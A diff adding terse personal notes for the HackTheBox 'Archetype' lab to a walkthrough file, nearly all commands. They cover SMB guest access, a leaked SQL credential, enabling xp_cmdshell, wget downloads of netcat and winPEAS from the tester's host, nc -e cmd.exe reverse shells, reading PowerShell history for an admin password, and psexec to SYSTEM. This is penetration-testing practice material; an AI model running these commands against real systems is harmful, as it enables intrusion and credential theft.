@@ -202,3 +202,91 @@ aws s3 ls --endpoint-url http://10.129.15.129:8 s3://s3.thetopper.htb
 curl http://10.129.123.168/shellme/shellid.php?cmd=type%20../../flag.txt -H "HOST: thetoppers.htb"
 
 a980d99281a28d638ac68b9bf9453c2b
+
+# Archetype
+10.129.17.153
+HackTheBox Archetype Walkthrough
+nmap -F -sV -sC 10.129.17.153
+1433
+
+smbclient -U guest -L 10.129.17.153
+backups
+
+smbclient -U guest \\\\10.129.17.153\\backups
+get prod.dtsConfig
+
+cat prod.dtsConfig
+M3g4c0rp123
+
+git clone https://github.com/fortra/impacket.git
+cd impacket
+virtualenv --python python3 ~/impacket/impacketenv
+source ~/impacket/impacketenv/bin/activate
+pip3 install -r requirements.txt
+python3 setup.py install
+
+sudo find / -name "mssqlclient.py"
+python3 ~/impacket/examples/mssqlclient.py Archetype/sql_svc:M3g4c0rp123@10.129.17.153 -windows-auth
+
+xp_cmdshell whoami
+SELECT is_srvrolemember('sysadmin');
+EXEC sp_configure 'xp_cmdshell', 1
+RECONFIGURE
+EXEC sp_configure 'xp_cmdshell', 1
+RECONFIGURE
+xp_cmdshell whoami
+
+xp_cmdshell echo %cd%
+xp_cmdshell dir C:\Users\
+xp_cmdshell "powershell cat C:\Users\sql_svc\Desktop\user.txt"
+3e7b102e78218e935bf3f4951fec21a3
+xp_cmdshell "powershell ls C:\Users\Administrator"
+
+python -m http.server 4444
+xp_cmdshell "powershell -c wget http://10.10.16.75:4444/nc64.exe -outfile C:\Users\sql_svc\Downloads"
+
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.16.75:4444/nc64.exe -outfile nc64.exe"
+
+nc -lvnp 4444
+SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.16.75 4444"
+whoami
+cd ..\Desktop\
+type user.txt
+
+cp /opt/useful/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe ~/archetype/
+cd ~/archetype/
+python -m http.server 4444
+powershell -c wget http://10.10.16.75:4444/winPEASx64.exe -outfile winPEASx64.exe
+
+powershell -c .\winPEASx64.exe
+
+winpeas
+
+type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+xp_cmdshell type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+administrator MEGACORP_4dm1n!!
+
+sudo find / -name "winPEASx64.exe"
+python3 ~/impacket/examples/psexec.py administrator@10.129.17.153
+whoami
+cd C:\Users\Administrator\Desktop
+type root.txt
+b91ccec3305e98240082d4474b848528
+
+cd ~/Public
+curl https://github.com/int0x33/nc.exe/blob/master/nc.exe -o nc.exe
+https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md
+curl https://github.com/peass-ng/PEASS-ng/releases/tag/20240623-7d729c04/winPEASx64.exe -o winPEASx64.exe
+
+python3 -m http.server
+xp_cmdshell "powershell.exe wget http://10.10.16.75:8000/winPEASx64.exe -OutFile c:\\Users\Public\winPEASx64.exe"
+xp_cmdshell "powershell.exe wget http://10.10.16.75:8000/nc.exe -OutFile c:\\Users\Public\nc.exe"
+xp_cmdshell "powershell.exe wget https://github.com/peass-ng/PEASS-ng/releases/tag/20240623-7d729c04/winPEASx64.exe -OutFile c:\\Users\Public\winPEASx64.exe"
+
+xp_cmdshell "powershell -c ls C:\Users\Public"
+
+nc -lvnp 4444
+xp_cmdshell "c:\Users\Public\winPEASx64.exe -e cmd.exe 10.10.16.75 4444"
+xp_cmdshell "powershell -c C:\Users\Public\winPEASx64.exe"
+xp_cmdshell "c:\\Users\Public\\nc.exe -e cmd.exe 10.10.16.75 4444"
